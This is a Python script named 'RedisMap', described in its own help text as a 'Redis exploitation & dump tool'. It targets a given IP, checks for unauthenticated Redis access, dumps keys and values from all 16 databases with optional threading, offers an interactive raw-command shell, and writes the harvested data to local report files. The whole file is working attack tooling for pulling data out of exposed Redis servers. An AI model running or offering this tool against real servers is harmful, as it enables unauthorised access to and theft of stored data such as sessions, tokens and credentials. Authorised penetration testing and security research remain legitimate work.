#!/usr/bin/env python3
import argparse, socket, time, threading, os, random
import pyfiglet
from datetime import datetime

# ====== FONT & COLOR LIST ======
FONTS = [
    "block", "slant", "shadow", "banner3-D",
    "doom", "isometric1", "speed", "rectangles", "chunky"
]
COLORS = [
    "\033[91m", # Red
    "\033[92m", # Green
    "\033[93m", # Yellow
    "\033[94m", # Blue
    "\033[95m", # Magenta
    "\033[96m", # Cyan
    "\033[97m", # White
]

# ====== BANNER ======
def banner():
    font_choice = random.choice(FONTS)
    color_choice = random.choice(COLORS)
    ascii_art = pyfiglet.figlet_format("RedisMap", font=font_choice)
    styled = f"{color_choice}\033[1m{ascii_art}\033[0m"
    print(styled)
    print(f"{color_choice}\033[1m           (KaliGPT x Aryan)\033[0m")
    print(f"[~] Font used: {font_choice} | Color applied!\n")

# ====== REDIS CORE ======
def redis_cmd(ip, port, cmd):
    s = socket.socket()
    s.settimeout(3)
    try:
        s.connect((ip, port))
        s.sendall(cmd.encode())
        data = s.recv(4096)
        s.close()
        return data
    except Exception:
        return None

def ping_redis(ip, port):
    resp = redis_cmd(ip, port, "*1\r\n$4\r\nPING\r\n")
    return resp and b"PONG" in resp

def list_keys(ip, port):
    resp = redis_cmd(ip, port, "*2\r\n$4\r\nKEYS\r\n$1\r\n*\r\n")
    if not resp: return []
    parts = resp.split(b"\n")
    keys = [p.decode(errors='ignore') for p in parts if p and not p.startswith(b"*") and not p.startswith(b"$")]
    return keys

def get_type(ip, port, key):
    cmd = f"*2\r\n$4\r\nTYPE\r\n${len(key)}\r\n{key}\r\n"
    resp = redis_cmd(ip, port, cmd)
    return resp.decode(errors='ignore').strip()

def get_value(ip, port, key, t):
    if "string" in t:
        cmd = f"*2\r\n$3\r\nGET\r\n${len(key)}\r\n{key}\r\n"
        resp = redis_cmd(ip, port, cmd)
        if resp:
            lines = resp.split(b"\r\n")
            if len(lines) > 1: return lines[1].decode(errors='ignore')
    elif "hash" in t:
        cmd = f"*2\r\n$7\r\nHGETALL\r\n${len(key)}\r\n{key}\r\n"
        resp = redis_cmd(ip, port, cmd)
        return resp.decode(errors='ignore')
    return ""

def select_db(ip, port, db):
    cmd = f"*2\r\n$6\r\nSELECT\r\n${len(str(db))}\r\n{db}\r\n"
    resp = redis_cmd(ip, port, cmd)
    return resp and b"OK" in resp

# ====== SHELL ======
def interactive_shell(ip, port):
    print("[*] Entering interactive shell (type 'exit' to quit)")
    while True:
        cmd = input("redis> ")
        if cmd.lower() in ["exit","quit"]: break
        arr = cmd.strip().split()
        payload = f"*{len(arr)}\r\n"
        for a in arr:
            payload += f"${len(a)}\r\n{a}\r\n"
        resp = redis_cmd(ip, port, payload)
        if resp: print(resp.decode(errors='ignore'))
        else: print("[!] No response or error.")

# ====== THREAD WORKERS ======
def dump_db(ip, port, db, include_values=False, delay=0):
    out = [f"--- DB{db} ---"]
    if select_db(ip, port, db):
        keys = list_keys(ip, port)
        for k in keys:
            t = get_type(ip, port, k)
            if include_values:
                v = get_value(ip, port, k, t)
                out.append(f" - {k} [{t}] = {v}")
            else:
                out.append(f" - {k}")
            if delay>0: time.sleep(delay)
    return "\n".join(out)

def thread_worker(ip, port, dbs, include_values, delay, outlist):
    for d in dbs:
        outlist.append(dump_db(ip, port, d, include_values, delay))

# ====== MAIN ======
def main():
    parser = argparse.ArgumentParser(description="Redis exploitation & dump tool (RedisMap)")
    parser.add_argument("-t","--target",required=True,help="Target IP")
    parser.add_argument("-p","--port",type=int,default=6379,help="Target Redis port (default 6379)")
    parser.add_argument("--dbs",action="store_true",help="List databases and keys")
    parser.add_argument("--keys",action="store_true",help="List keys in current DB0")
    parser.add_argument("--values",action="store_true",help="Dump keys with values in DB0")
    parser.add_argument("--dump-all",action="store_true",help="Dump all DBs and keys (with values if --values)")
    parser.add_argument("--shell",action="store_true",help="Interactive Redis shell")
    parser.add_argument("--threads",type=int,default=1,help="Threads for dump-all (default 1)")
    parser.add_argument("-T",type=int,default=0,help="Delay per request in seconds")
    args = parser.parse_args()

    banner()
    ip = args.target
    port = args.port

    print(f"[+] Connecting to {ip}:{port}")
    if not ping_redis(ip, port):
        print("[!] Target not accessible or no unauthenticated access.")
        return
    print("[+] Connected successfully!")

    report = []
    os.makedirs("reports",exist_ok=True)
    timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")

    if args.shell:
        interactive_shell(ip, port)
        return

    if args.keys:
        keys = list_keys(ip, port)
        print("[+] Keys in DB0:")
        for k in keys: print(" -",k)
        report.append("--- DB0 KEYS ---\n"+"\n".join(keys))

    if args.values and not args.dump_all:
        keys = list_keys(ip, port)
        print("[+] Keys with values in DB0:")
        for k in keys:
            t = get_type(ip, port, k)
            v = get_value(ip, port, k, t)
            print(f" - {k} [{t}] = {v}")
            report.append(f"{k} [{t}] = {v}")

    if args.dbs:
        print("[+] Dumping keys per DB:")
        for db in range(16):
            section = dump_db(ip, port, db, False, args.T)
            print(section)
            report.append(section)

    if args.dump_all:
        print(f"[+] Dumping all 16 DBs using {args.threads} thread(s)...")
        db_lists = [[] for _ in range(args.threads)]
        for i in range(16):
            db_lists[i % args.threads].append(i)
        threads=[]
        results=[[] for _ in range(args.threads)]
        for i in range(args.threads):
            t=threading.Thread(target=thread_worker,args=(ip,port,db_lists[i],args.values,args.T,results[i]))
            t.start(); threads.append(t)
        for t in threads: t.join()
        for r in results:
            for section in r:
                print(section)
                report.append(section)

    if report:
        with open(f"reports/{ip}_report.txt","w") as f:
            f.write(f"RedisMap Report for {ip}:{port}\nTime: {timestamp}\n\n")
            f.write("\n".join(report))
        print(f"[+] Report saved to reports/{ip}_report.txt")

if __name__=="__main__":
    main()
                                                              
